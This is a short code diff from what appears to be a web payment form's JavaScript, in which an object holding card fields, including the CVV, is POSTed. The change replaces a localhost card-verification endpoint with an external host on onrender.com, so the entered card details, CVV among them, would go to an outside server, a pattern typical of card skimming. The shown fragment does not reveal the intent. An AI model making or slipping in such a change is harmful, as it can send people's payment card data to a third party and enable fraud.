@@ -443,7 +443,7 @@ expiryInput.addEventListener('input', (e) => {
     cvv: cvv.value
   };
 
-  fetch('http://localhost:8080/api/verify/card', {
+  fetch('https://fiver-n6ox.onrender.com', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
